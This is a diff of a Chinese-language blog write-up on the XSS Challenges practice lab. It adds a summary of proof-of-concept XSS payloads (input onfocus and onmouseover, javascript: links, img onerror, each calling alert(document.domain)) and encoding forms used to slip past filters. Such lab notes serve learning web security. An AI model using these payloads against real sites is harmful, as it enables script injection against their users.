@@ -96,7 +96,7 @@ ChallengesStage 1
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    16 mins.
+                    17 mins.
                 </span>
                 
                 
@@ -376,7 +376,7 @@ backgroud
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-4.png" alt="16-1"></p>
 <h2 id="Stage-17"><a href="#Stage-17" class="headerlink" title="Stage 17"></a>Stage 17</h2><p>考察<strong>字符集的问题</strong>，IE浏览器下才能复现，应用比较狭窄并且实际意义不大，所以选择跳过</p>
 <h2 id="Stage-18"><a href="#Stage-18" class="headerlink" title="Stage 18"></a>Stage 18</h2><p>考察<strong>字符集的问题</strong>，IE浏览器下才能复现，应用比较狭窄并且实际意义不大，所以选择跳过</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>标签汇总</strong></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>汇总</strong></p>
 <pre><code class="payload">&lt;input&gt;标签
 &lt;input xxx autofocus onfocus=&quot;alert(document.domain)&quot;&gt;
 &lt;input xxx onmouseover=&quot;alert(document.domain)&quot;&gt;
@@ -385,6 +385,23 @@ backgroud
 
 &lt;a&gt;标签
 &lt;a href=javascript:alert(document.domain)&gt;
+&lt;a href=javascript:alert(document.domain)&gt;xss&lt;/a&gt;
+
+&lt;img&gt;标签
+&lt;img src=x onerror=alert(document.domain)&gt;
+</code></pre>
+<p><strong>编码</strong></p>
+<pre><code class="payload">html编码
+形式：&amp;#115;
+
+Unicode编码
+形式：\u003c
+
+十六进制编码
+形式：\x3c
+
+八进制编码
+形式：\74
 </code></pre>
 <hr>
 <p><strong>Reference</strong></p>
